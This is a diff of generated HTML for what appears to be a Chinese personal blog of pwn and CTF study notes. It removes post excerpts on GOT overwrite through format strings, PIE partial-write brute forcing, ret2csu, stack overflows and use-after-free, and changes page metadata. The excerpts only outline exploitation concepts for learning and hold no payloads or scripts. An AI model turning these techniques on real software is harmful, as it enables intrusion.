-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址
-我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力
-但是如果是篡改puts函数的got表呢？
-我们知道 动态链接的情况下 当我们调用一个函数时
-他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用
-如果我们将其got表内存储的真实地址修改为其他函数的真实地址
-那么当程序调用原函数...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-12T10:25:53+08:00">2022-10-12</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/09/密码学笔记/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"  itemprop="url">
-        密码学笔记
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        自己用的密码学笔记 不准备讲的跟pwn一样详细
-MD5hash算法一类 32位数字和字母混合码
-base
-base16：包含数字0-9，大写字母A-F 
-base32：包含数字2-7，大写字母A-Z,特殊符号&#x3D;&#x3D;&#x3D; 
-base64：包含数字0-9，大写字母A-Z，小写字母a-z，特殊符号+、&#x2F; 、&#x3D;&#x3D;、&#x3D;等
-
-32和64区...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-09T23:12:10+08:00">2022-10-09</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E5%AF%86%E7%A0%81/">密码</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E5%AF%86%E7%A0%81/" itemprop="url"><span itemprop="name">密码</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/06/简单爆破partial-write/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/"  itemprop="url">
-        简单爆破partial write
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        原理分析本篇介绍ret2text的一种特殊情况
-先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚
-我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？
-这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移
-
-如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？
-不知道你还记不记得我们曾经讲过虚拟内存分页...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-06T17:23:02+08:00">2022-10-06</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/06/HNCTF2022-ret2csu/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/06/HNCTF2022-ret2csu/"  itemprop="url">
-        HNCTF2022.ret2csu
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        看一下保护机制
-
-再拖到ida里看一下
-123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(_bss_start, 0LL);  write(1, &quot;Start Your E...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-06T16:50:29+08:00">2022-10-06</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/wp/">wp</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/06/HNCTF2022-ret2csu/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/栈溢出-特殊情况/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/"  itemprop="url">
-        栈溢出-特殊情况
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        本篇博客用来记录一种特殊的情况
-直接上例题吧 看完就知道什么意思了
-12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[56]; // [esp+4h] [ebp-38h] BYREF  printf(&quot;Qual a palavrinha magica? &q...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-03T11:25:33+08:00">2022-10-03</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/溢出覆盖变量/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/"  itemprop="url">
-        溢出覆盖变量
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧
-我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数据 通常我们都是用一些没有意义的垃圾数据去覆盖他
-但是有些题目 就可能会故意刁难我们
-比如下面这题
-
-是吧 他都把var[13]赋值为了0 结果要var[13]&gt;0并且&#x3D;17才能达到我...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-03T00:55:35+08:00">2022-10-03</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/01/UAF/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/01/UAF/"  itemprop="url">
-        UAF
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了
-UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧
-就是当我们把一个chunk释放之后 再利用他
-怎么做到这一点？
-1234567891011...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-01T21:10:23+08:00">2022-10-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E5%A0%86/">堆</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E5%A0%86/" itemprop="url"><span itemprop="name">堆</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/10/01/UAF/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2944,172 +2639,42 @@ UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很�
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://s1.ax1x.com/2022/11/11/zCx4US.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Chen</h2>
-        
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop pjax">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/Linux/" href="/categories/Linux/"
-            active-action="action-categoriesLinux"
-            ><div class='name'>Linux</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/web/" href="/categories/web/"
-            active-action="action-categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/wp/" href="/categories/wp/"
-            active-action="action-categorieswp"
-            ><div class='name'>wp</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%9F%BA%E7%A1%80/" href="/categories/%E5%9F%BA%E7%A1%80/"
-            active-action="action-categoriesE59FBAE7A180"
-            ><div class='name'>基础</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%A0%86/" href="/categories/%E5%A0%86/"
-            active-action="action-categoriesE5A086"
-            ><div class='name'>堆</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%AF%86%E7%A0%81/" href="/categories/%E5%AF%86%E7%A0%81/"
-            active-action="action-categoriesE5AF86E7A081"
-            ><div class='name'>密码</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%A0%88/" href="/categories/%E6%A0%88/"
-            active-action="action-categoriesE6A088"
-            ><div class='name'>栈</div><div class='badge'>(14)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/" href="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"
-            active-action="action-categoriesE8999AE68B9FE69CBA"
-            ><div class='name'>虚拟机</div><div class='badge'>(4)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget text desktop pjax">
-  
-  <header>
-    
-      <a target="_blank" rel="noopener" href='https://space.bilibili.com/185447556'><i class="fab fa-github fa-fw" aria-hidden="true"></i><span class='name'>b站账号</span></a>
-    
-  </header>
-
-
-  <div class='content'>
-    
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <div class="">
+    <!-- pjax占位 -->
+  </div>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -3137,13 +2702,14 @@ UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很�
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3152,14 +2718,14 @@ UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很�
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3657,7 +3223,7 @@ UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很�
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2022/","name":"2022"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2022/10/","name":"10"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/wp/","name":"wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/14/babyheap-0ctf-2017/","name":"babyheap_0ctf_2017"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"babyheap_0ctf_2017","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/14/babyheap-0ctf-2017/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/14/babyheap-0ctf-2017/","wordCount":0,"datePublished":"2022-11-14T01:24:11.000Z","dateModified":"2022-11-14T01:50:44.850Z","articleSection":"wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
